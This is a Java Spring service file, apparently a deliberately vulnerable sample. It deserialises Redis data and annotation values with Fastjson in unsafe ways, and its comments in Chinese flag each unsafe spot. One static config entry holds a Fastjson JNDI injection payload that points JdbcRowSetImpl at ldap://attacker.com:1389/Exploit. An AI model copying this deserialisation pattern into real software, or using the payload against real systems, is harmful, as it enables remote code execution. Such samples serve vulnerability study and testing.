import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.stereotype.Service;
import javax.annotation.Resource;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

@Service
public class DynamicDataSourceService {
    @Resource
    private RedisTemplate<String, Object> redisTemplate;

    public DynamicDataSourceModel getCacheDynamicDataSourceModel(String uuid) {
        try {
            // 不安全的反序列化入口点
            String rawData = (String) redisTemplate.opsForValue().get("cart:" + uuid);
            // Fastjson反序列化配置不当
            return JSON.parseObject(rawData, DynamicDataSourceModel.class, Feature.SupportNonPublicField);
        } catch (Exception e) {
            return new DynamicDataSourceModel();
        }
    }

    // 元编程实现动态模型构建
    public static class DynamicDataSourceModel {
        private Map<String, Object> properties = new HashMap<>();

        public DynamicDataSourceModel() {
            // 模拟大数据处理时的动态属性加载
            try {
                Class<?> clazz = Class.forName("com.example.BigDataProcessor");
                Field field = clazz.getDeclaredField("config");
                field.setAccessible(true);
                this.properties.put("processorConfig", field.get(null));
            } catch (Exception e) {
                // 忽略异常处理
            }
        }

        // 攻击面：包含恶意注解的Post类
        @Retention(RetentionPolicy.RUNTIME)
        @interface LAST_ASSOCIATED_CATEGORIES_ANNO {
            String value() default "[]";
        }

        // 模拟存在漏洞的元编程处理
        public void processMetadata(Class<?> targetClass) {
            if (targetClass.isAnnotationPresent(LAST_ASSOCIATED_CATEGORIES_ANNO.class)) {
                LAST_ASSOCIATED_CATEGORIES_ANNO anno = targetClass.getAnnotation(LAST_ASSOCIATED_CATEGORIES_ANNO.class);
                // 恶意JSON注入点
                String json = anno.value();
                // 不安全的反序列化链
                Map payload = JSON.parseObject(json, Map.class);
                properties.putAll(payload);
            }
        }
    }

    // 模拟大数据处理组件
    public static class BigDataProcessor {
        private static final Map<String, String> config = new HashMap<>();
        static {
            config.put("executionEngine", "spark");
            // 潜在的攻击入口点
            config.put("maliciousData", "{\\"@type\\":\\"com.sun.rowset.JdbcRowSetImpl\\",\\"dataSourceName\\":\\"ldap://attacker.com:1389/Exploit\\"}");
        }
    }
}